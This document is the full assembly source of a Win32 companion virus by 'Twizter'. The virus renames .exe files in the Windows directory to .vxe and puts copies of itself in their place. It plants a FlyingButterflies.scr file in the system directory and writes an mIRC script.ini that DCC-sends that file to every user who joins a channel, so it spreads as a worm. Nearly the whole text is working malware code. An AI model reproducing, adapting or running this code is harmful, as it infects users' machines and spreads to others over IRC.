;This is a simple win32 companion virus, which
;utilizes mirc as a worm            .
;
;By Twizter      


.386p
.model flat
.code

;=============================

extrn	GetSystemDirectoryA:proc;
extrn	GetWindowsDirectoryA:proc;
extrn	lstrcat:proc;
extrn	ExitProcess:proc;
extrn	GetModuleHandleA:proc;
extrn	GetModuleFileNameA:proc;
extrn	FindFirstFileA:proc;
extrn	FindNextFileA:proc;
extrn	CopyFileA:proc;
extrn	DeleteFileA:proc;
extrn	MoveFileA:proc;
extrn	_lopen:proc;
extrn	_lwrite:proc;
extrn	_lclose:proc;
extrn	WinExec:proc;
extrn	SetFilePointer:proc;
extrn	GetCurrentDirectoryA:proc;
extrn	SetCurrentDirectory:proc;
extrn	_lread:proc;
extrn	_lcreat:proc;
extrn	SetCurrentDirectoryA:proc;

;=============================

include windows.inc

;=============================

_off_	equ	2722d
_scrpt_	equ	offset end_script - offset IniData1

;=============================

begin:
	push	00000001
	push	offset cFileName
	call	WinExec

	push	offset path3
	push	260
	call	GetCurrentDirectoryA

	push 	25
	push 	offset path2
	call 	GetWindowsDirectoryA

	push	offset path2
	call	SetCurrentDirectoryA

	push	offset	handle1
	call	GetModuleHandleA

	push 	50
	push 	offset handle2
	push 	eax
	call	GetModuleFileNameA

	push	offset filedta
	push	offset maska
	call	FindFirstFileA

	mov	dword ptr [handle_],eax
	cmp	eax,	0
	je	done_this
check:
;	cmp	nFileSizeLow, 6000d
;	jle	nextfile
	mov	bx,	word ptr[cFileName]
	cmp	bx,	'XE'
	je	nextfile
	cmp	bx,	'UR'
	je	nextfile
	cmp	bx,	'ur'
	je	nextfile
	cmp	bx,	'ME'
	je	nextfile
	lea	esi,	[cFileName]
	lea	edi,	[newfilename]
stowit:
	lodsb
	cmp	al,	'.'
	je	addext
	stosb
	jmp	stowit
addext:
	stosb
	lea	esi,	[newext]
	movsw
	movsw
	push	0
	push	offset newfilename
	push	offset cFileName
	call	MoveFileA

	push	0
	push	offset cFileName
	push	offset handle2
	call	CopyFileA

	push	2
	push	offset cFileName
	call	_lopen

	mov	dword ptr [_handle],eax

	push	dword 0
	push	NULL
	push	_off_
	push	eax
	call	SetFilePointer

	mov	eax,	dword ptr [_handle]

	push	50
	push	offset newfilename
	push	eax
	call	_lwrite

	push	eax
	call	_lclose
nextfile:

	push	offset filedta
	mov	eax,	dword ptr [handle_]
	push	eax
	call	FindNextFileA
	cmp	eax,	0
	je	done_this
	jmp	check

done_this:

	push 	25
	push 	offset path1
	call 	GetSystemDirectoryA

	push 	offset handle3
	push 	offset path1
	call 	lstrcat

	push	0
	push	offset path1
	push	offset handle2
	call	CopyFileA

	push	2
	push	offset MircLNK	
	call	_lopen

	mov	dword ptr [_handle],eax
	push	dword 2
	push	NULL
	push	-50
	push	eax
	call	SetFilePointer
	mov	eax,	dword ptr [_handle]

	push	50
	push	offset 	MircDir
	push	eax
	call	_lread

	push	eax
	call	_lclose

	std
	lea	esi,	MircIni
get_next_byte:
	lodsb
	cmp	al,	':'
	jne	get_next_byte

	push 	offset MircIni
	push 	esi
	call 	lstrcat

	push	0
	push	esi
	call	_lcreat

	push	_scrpt_
	push	offset IniData1
	push	eax
	call	_lwrite

	push	eax
	call	_lclose

	push	offset path3
	call	SetCurrentDirectoryA

	push	0
	call	ExitProcess

;=============================

.data
handle1		db	50 	dup(0)
handle2		db	50 	dup(0)
maska		db	'*.exe',0
newext		db	'vxe',0
handle_		dd	0
_handle		dd	0
filedta:
FileAttributes	dd	0
CreationTime 	db	8	dup(0)
LastAccessTime	db	8	dup(0)
LastWriteTime	db	8	dup(0)
nFileSizeHigh	dd	0
nFileSizeLow	dd	0
dwReserved0	dd	0
dwReserved1	dd	0
cFileName	db	50	dup('N')
cAltFileName	db	14	dup(0)
newfilename	db	50	dup(0)

path2		db	25	dup(0)
path3		db	260	dup(0)
MircLNK		db	'Start Menu\Programs\mIRC\mIRC32.LNK',0
MircDir		db	50	dup(0)
MircIni		db	'\script.ini',0
Mirc_		db	'c:\mirc\script.ini',0
IniData1:
		db	'[Script]',0dh,0ah
		db	'n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }',0dh,0ah
		db	'n1=  /dcc send $nick '
path1		db	25	dup(0)
handle3		db	'\FlyingButterflies.scr',0,'}'
		db	100	dup(0)
end_script:

		
	end	begin









